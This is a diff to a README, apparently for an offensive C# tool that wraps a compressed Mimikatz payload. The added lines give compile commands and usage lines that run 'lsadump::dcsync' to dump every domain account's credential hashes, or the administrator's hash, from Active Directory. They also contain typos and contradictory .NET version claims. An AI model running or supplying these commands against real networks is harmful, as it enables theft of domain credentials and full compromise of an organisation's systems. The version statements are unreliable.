@@ -80,13 +80,23 @@ The source code in KatzCompressed is https://github.com/3gstudent/test/blob/mast
 
 You can use https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/GzipandBase64.cs to generate the KatzCompressed string.
 
+The source code supprot 4.0 or later.
+
+This code supprot 3.5 or later.
+
 Complie:
 
 `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe DcsyncofMimikatz.cs`
 
+or
+
+`C:\Windows\Microsoft.NET\Framework64\v3.5\csc.exe /unsafe DcsyncofMimikatz.cs`
+
 Usage:
 
 `DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /all /csv" exit`
+
+`DcsyncofMimikatz.exe log "lsadump::dcsync /domain:test.com /user:administrator /csv" exit`
 
 ---
 
